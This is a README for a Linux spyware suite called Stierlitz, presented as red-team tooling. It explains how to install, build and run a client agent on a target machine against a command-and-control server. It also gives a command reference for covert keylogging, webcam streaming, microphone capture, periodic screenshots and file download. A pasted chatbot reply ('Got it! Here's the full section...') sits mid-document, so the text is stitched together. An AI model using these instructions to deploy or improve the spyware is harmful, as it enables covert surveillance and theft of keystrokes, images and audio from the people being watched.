# STIERLITZ
---

![stierlitz](img/stierlitz.jpg)

**Stierlitz** is a Linux-based, multi-client spyware suite designed for red team operations. It provides a range of real-time surveillance and data exfiltration capabilities, including:

-  Webcam capture with live display (`webcam-recorder`)
-  Periodic screenshot capture (X11 only)
-  ALSA audio harvesting with playback (`alsa-harvester`)
-  Keylogging with layout support
-  File downloading

---

## Project Structure

- **`Client/`** – The malware agent deployed on the target machine.
- **`Server/`** – Acts as a command-and-control proxy between clients and tunnels. Manages clients, data routing (via FIFOs), and status tracking.
- **`URXVT/`** – Tunnel modules launched in isolated `urxvt` terminals. Each tunnel handles a specific stream (e.g., video, audio, screenshots) and performs display, processing, or saving.

> ⚠️ **Note**: Each tunnel spawns a dedicated `urxvt` instance using custom profiles located in `URXVT/profiles/`. If you're an existing URXVT user, it's **highly recommended** you back up your configuration before running `urxvt_setup.sh`. While it avoids overwriting, it's best to be cautious.

---

## Installation

```bash
./install_malware.sh      # Installs client dependencies
./install_server.sh       # Installs server dependencies
./urxvt_setup.sh          # Sets up urxvt profiles for tunnels
```

## Build

```
mkdir build && cd build
cmake ..
make
```

- To enable debugging and print statements from the client during runtime, build in Debug mode:
```
cmake -DCMAKE_BUILD_TYPE=Debug ..
```

Got it! Here's the full section starting from **Usage**, written as valid Markdown content (not inside a code block), so you can copy and paste it directly into your `README.md` file:

---

## Usage

### Run the Malware

```bash
./client <IP> <port>
```

---

### Command Reference

![help](img/help.png)

#### `list`

Displays all active clients, their IP addresses, corresponding indexes, current status, and active tunnels.

![list](img/list.png)

---

#### `keylogger`

> ⚠️ Requires root privileges

By default, it uses `/dev/input/event0`. To change the input device:

```bash
-d <index> 
eg. -d 10
```

To change the keyboard layout (default is `"us"`):

```bash
-l <layout> or --layout <layout>
```

To list available input devices:

```bash
get-dev
```

![keylogger](./img/keylogger.png)

---

#### `webcam-recorder`

> ⚠️ Requires access to `/dev/videoX` (uses `videodev2`)

Streams the webcam feed in real time.

![webcam-recorder](./img/webcam-recorder.png)

---

#### `alsa-harvester`

> ⚠️ Depends on ALSA; stereo-only for now

Captures audio from an ALSA input device and plays it on an output device.

**Defaults:**

* Input: `hw:0,0`
* Output: `hw:0,0`

To identify devices:

```bash
arecord -l   # Lists input devices
aplay -l     # Lists output devices
```

**Arguments:**

> ⚠️ Make sure to use headphones if you are testing this feature on the same computer in order to prevent high pitch audio due to a sound loop. Pick the corresponding -hwo

* `-hwi`: ALSA input device
* `-hwo`: ALSA output device

![alsa-harvester](./img/alsa-harvester.png)

---

#### `screen-hunter`

> ⚠️ Only works on X11 (not compatible with Wayland)

Captures screenshots at fixed intervals.

**Default FPS:** `0.2` (1 screenshot every 5 seconds)

To change:

```bash
-fps <float>
```

![screen-hunter](./img/screen-hunter.png)

---

## To Do

* Add output saving functionality to `screen-hunter` and `alsa-harvester`.
* Support mono devices in `alsa-harvester`.
* Implement additional commands such as `cat`, process listing, and remote shell.

---